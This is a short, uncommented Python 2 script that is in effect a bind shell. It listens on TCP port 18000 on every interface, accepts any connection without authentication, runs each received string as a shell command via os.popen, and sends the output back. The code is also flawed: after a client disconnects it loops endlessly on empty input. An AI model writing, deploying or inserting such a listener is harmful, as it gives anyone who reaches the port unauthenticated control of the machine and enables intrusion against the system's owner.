#!/usr/bin/env python
import socket
import time
import os

host = ''
port = 18000
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((host,port))
s.listen(2)

while 1:
    conn,addr = s.accept()

    print 'Got connection from:',addr
    while 1:
        data = conn.recv(1024)
        print 'get data',data,'on',time.strftime('%y/%m/%d %H:%M:%S')
        if not data:
            time.sleep(1)
            #break
        cmd = os.popen(data)
        result = cmd.read()
        print result
        conn.sendall(result)
conn.close()
